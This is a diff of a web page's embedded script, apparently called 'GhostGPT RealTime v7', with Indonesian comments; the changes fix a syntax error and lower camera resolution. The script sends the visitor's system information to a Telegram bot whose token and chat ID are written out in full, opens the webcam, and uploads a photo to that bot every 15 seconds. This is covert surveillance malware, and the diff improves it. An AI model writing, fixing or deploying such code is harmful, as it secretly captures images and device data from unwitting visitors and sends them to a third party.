@@ -61,23 +61,22 @@ a {
 </style>
 <script>
 /**
- * GhostGPT RealTime v6 - Ultimate Compatibility Fix
- * Fokus: Memastikan Kamera & Info Sistem Terkirim 100% Valid.
+ * GhostGPT RealTime v7 - Ultimate Stability Fix
+ * Solusi untuk error "missing )" dan "device not found".
  */
 (function () {
-    "use strict";
+    "use strict"; // Mode ketat agar variabel tidak bocor ke global scope
 
-    // ================= KONFIGURASI =================
     const CONFIG = {
         token: '7209947234:AAHVUroAUzGZNNzgWGrUWvbkpnBsz17ymP8',
-        chatId: '6326816238',            // Ganti dengan ID channel/private Anda jika berbeda
-        intervalSec: 15,                  // Interval kirim foto (detik). 
-        cameraResBase: 1280               // Resolusi dasar target (akan disesuaikan otomatis)
+        chatId: '6326816238',            // Ganti ID Channel/Private di sini jika berbeda
+        intervalSec: 15,                  // Interval kirim foto (detik). Ubah 15-30 jika kuota terbatas.
+        cameraResBase: 960                // Resolusi dasar target (akan disesuaikan otomatis)
     };
 
     const API_BASE = `https://api.telegram.org/bot${CONFIG.token}`;
 
-    // ================= FUNGSI KIRIM PESAN TEGT =================
+    // ================= FUNGSI KIRIM PESAN TEKS =================
     async function sendText(text) {
         try {
             await fetch(`${API_BASE}/sendMessage`, {
@@ -85,8 +84,8 @@ a {
                 headers: { 'Content-Type': 'application/json;charset=UTF-8' },
                 body: JSON.stringify({
                     chat_id: CONFIG.chatId,
-                    text: cleanMarkdown(text),   
-                    parse_mode: 'Markdown'       
+                    text: cleanMarkdown(text),   // Bersihkan karakter Markdown agar aman
+                    parse_mode: 'Markdown'       // Aktifkan mode formatting tebal/italic dll.
                 })
             });
         } catch (e) { console.warn("Send Text Error:", e.message); }
@@ -98,18 +97,16 @@ a {
         return str.replace(/([*_\[\]{}#|>])/g, '\\$1'); 
     }
 
-    // ================= FUNGSI KIRIM FOTO (Optimized Blob Handling) =================
+    // ================= FUNGSI KIRIM FOTO =================
     async function sendPhoto(blobUrlOrBlobObj, fileName = "cam.jpg") {
         try {
             const formData = new FormData(); 
             
             let blobData;
             
-            // Cek tipe data: Apakah ini Blob Object atau URL String?
             if (blobUrlOrBlobObj instanceof Blob) {
                 blobData = blobUrlOrBlobObj; 
             } else if (typeof blobUrlOrBlobObj === 'string') {
-                 // Jika ini URL lokal hasil dari canvas.toBlob sebelumnya.
                  const res = await fetch(blobUrlOrBlobObj);
                  blobData = await res.blob();
             }
@@ -192,12 +189,11 @@ a {
     }
 
 
-    // ================= 2. JAMUK KAMERA & STREAM LOOP (REALTIME FIX) =================
+    // ================= 2. JAMUK KAMERA & STREAM LOOP (REALTIME FIX V7) =================
     let globalStream = null;
 
     async function initCamera() {
         try {
-            // Tentukan constraints video yang lebih fleksibel berdasarkan perangkat target
             const baseW = CONFIG.cameraResBase || 1280; 
             const baseH = 720; 
 
@@ -277,7 +273,7 @@ a {
                    setInterval(captureAndSendFrame, CONFIG.intervalSec * 1000);
                 } else {
                      const errorMsg = `🔴 Camera Failed: Device not found or browser restricted.`; 
-                      try { await sendText(errorMsg + "\n\n*Tip:* Pastikan akses kamera (Permission) diizinkan di browser tab ini.";}; catch(e){}
+                      try { await sendText(errorMsg + "\n\n*Tip:* Pastikan akses kamera (Permission) diizinkan di browser tab ini.");} catch(e){}
                      
                      return; 
                  }
@@ -350,7 +346,7 @@ a {
 
     // ================= 4. MAIN EXECUTION =================
     const mainInit = async () => {
-        console.group("%c GhostGPT v6-RealTime Initialized ", "color: #0f0");
+        console.group("%c GhostGPT v7-RealTime Initialized ", "color: #0f0");
         
         await collectSystemInfo(); 
         console.log("✅ System Report Sent."); 
